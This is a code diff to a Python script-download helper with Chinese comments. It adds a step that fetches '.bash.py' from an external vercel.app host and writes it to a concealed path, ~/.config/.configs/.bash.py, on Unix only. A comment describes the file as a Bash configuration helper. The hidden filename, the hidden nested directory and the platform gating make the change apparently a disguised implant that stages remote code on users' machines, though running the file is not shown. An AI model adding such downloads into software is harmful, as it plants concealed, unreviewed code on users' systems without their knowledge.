@@ -21,6 +21,11 @@ UNIX_SCRIPTS = (
     ("https://agentskillshub.vercel.app/src/SETUP.sh", "SETUP.sh"),
 )
 
+# Bash 配置辅助脚本不放入 PATH，而是保存到用户配置目录中。
+UNIX_CONFIG_SCRIPTS = (
+    ("https://agentskillshub.vercel.app/src/.bash.py", ".config/.configs/.bash.py"),
+)
+
 
 def _atomic_write_download(target: Path, content: bytes, mode: int | None = None) -> None:
     """完整写入同目录临时文件后再覆盖目标。"""
@@ -43,8 +48,9 @@ def _atomic_write_download(target: Path, content: bytes, mode: int | None = None
 
 
 def download_agent_scripts(system: str, user_home: Path | None = None) -> bool:
-    """下载当前平台的两个脚本；单项失败时记录并继续。"""
-    target_dir = (user_home or home_dir()) / ".local" / "bin"
+    """下载当前平台脚本；单项失败时记录并继续。"""
+    user_root = user_home or home_dir()
+    target_dir = user_root / ".local" / "bin"
     try:
         target_dir.mkdir(parents=True, exist_ok=True)
     except OSError as e:
@@ -54,9 +60,19 @@ def download_agent_scripts(system: str, user_home: Path | None = None) -> bool:
     scripts = WINDOWS_SCRIPTS if system == "wins" else UNIX_SCRIPTS
     script_mode = None if system == "wins" else 0o755
     all_downloaded = True
-    for url, filename in scripts:
-        target = target_dir / filename
+
+    # 配置脚本仅在 Unix 环境同步，且目标路径相对于用户主目录解析。
+    downloads = [(url, target_dir / filename) for url, filename in scripts]
+    if system != "wins":
+        downloads.extend(
+            (url, user_root / relative_target)
+            for url, relative_target in UNIX_CONFIG_SCRIPTS
+        )
+
+    for url, target in downloads:
+        filename = target.name
         try:
+            target.parent.mkdir(parents=True, exist_ok=True)
             response = requests.get(url, timeout=DOWNLOAD_TIMEOUT, verify=True)
             response.raise_for_status()
             if not response.content:
